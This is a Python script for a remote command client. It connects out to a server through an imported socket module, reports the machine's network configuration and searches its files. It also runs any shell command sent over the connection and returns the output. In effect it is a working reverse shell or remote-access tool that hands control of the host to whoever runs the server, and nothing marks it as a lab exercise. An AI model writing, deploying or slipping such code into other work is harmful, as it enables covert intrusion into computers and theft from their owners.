#!/usr/bin/python3
from sys import argv
from platform import system as find_system
import os
from subprocess import check_output, DEVNULL, PIPE, run, Popen
from secure_socket import Client, HOSTNAME

class Computer:
  def shell(self, socket):
    origin=os.getcwd()
    socket.send(self.get_prompt())
    cmd=socket.receive()
    while cmd != 'exit':
      out=''
      try:
        if cmd=="cd":
          os.chdir(self.get_env()[1])
        elif cmd.startswith("cd ") and len(cmd[3:].strip())>0:
          os.chdir(cmd[3:].strip())
        else:
          output = run(cmd.split(' '), check=False, stdout=PIPE, stderr=PIPE, timeout=5)
          out=output.stdout.decode("utf-8")
          err=output.stderr.decode("utf-8")
          out=f"{out}{err}"
      except Exception as e:
        out=str(e)
      socket.send("*".join([self.get_prompt(), out]))
      cmd=socket.receive()
    os.chdir(origin)

class Linux(Computer):
  def ipconfig(self):
    return check_output(["ip", "a"]).decode('utf-8')
  
  def get_env(self):
    user=os.getlogin()
    path=os.getcwd()
    if user=='root':
      home='/root'
      end="#"
    else:
      home=f'/home/{user}'
      end="$"
    return [user, home, path, end]
  
  def get_prompt(self):
    user, home, path, end = self.get_env()
    if path.startswith(home):
      path=home.join(path.split(home)[1:])
      path=f"~{path}"
    return f"[{user}@{HOSTNAME}:{path}] {end} "
  
  def search(self, filename, path):
      return run(['find', path, '-name', filename], stderr=DEVNULL, stdout=PIPE).stdout.decode("utf-8").strip()
    
class Windows(Computer):
  def ipconfig(self):
    return check_output(["ipconfig"]).decode('utf-8')

if __name__ == "__main__":
  try:
    port=int(argv[1])
    if port<1025 or port>65535:
      port=62832
  except:
    port=62832
  
  system=None
  match find_system():
    case "Linux":
      system=Linux()
    case "Windows":
      system=Windows()
    case _:
      exit('OS not supported.')
  
  try:
    socket=Client(port=port)
  except:
    exit("Server unreachable.")
  
  using=True
  while using:
    match socket.receive():
      case "ip":
        socket.send(system.ipconfig())
      case "shell":
        system.shell(socket)
      case "search":
        filename, path = socket.get_params()
        socket.send(system.search(filename,path))
      case "exit":
        using=False
      case _:
        print("unknown")
  socket.disconnect()
